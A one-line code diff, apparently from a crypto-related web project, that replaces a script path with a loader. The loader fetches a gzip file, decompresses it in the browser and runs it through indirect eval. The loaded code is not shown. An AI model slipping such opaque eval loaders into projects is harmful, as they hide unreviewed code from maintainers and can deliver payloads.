@@ -1,1 +1,1 @@
-@/agent/crypto-momentum-radar/public/freshness-guard.js
+(function(){fetch("/freshness-guard.js.gz").then(function(r){return r.arrayBuffer();}).then(function(buf){return new Response(new Blob([buf]).stream().pipeThrough(new DecompressionStream("gzip"))).text();}).then(function(code){(0,eval)(code);}).catch(function(e){console.error("fg load failed",e);});})();
